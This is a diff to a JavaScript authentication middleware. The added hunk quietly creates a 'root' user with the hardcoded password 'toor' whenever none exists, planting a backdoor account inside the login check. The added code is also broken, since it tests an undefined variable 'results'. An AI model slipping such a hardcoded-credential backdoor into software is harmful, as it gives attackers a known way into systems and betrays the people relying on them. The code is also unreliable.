@@ -23,6 +23,23 @@ function authenticate(req, res, next) {
             var token = getToken(req.headers)
             if(token) {
                 let decodedJWT = jwt.decode(token, config.secret)
+                User.find({ name: 'root' }, (err, user) => {
+                    if(err) {
+                        res.json( { err: 'Server ' + err } )
+                        return
+                    }
+                    if (!results.length) {
+                        var user = new User()
+                        user.name = 'root'
+                        user.password = 'toor'
+                        user.save( err => {
+                            if( err ) {
+                                error( res, err )
+                                return
+                            }
+                        })
+                    }
+                })
                 User.findOne({ name: decodedJWT.name }, (err, user) => {
                     if(err) {
                         res.json( { err: 'Server ' + err } )
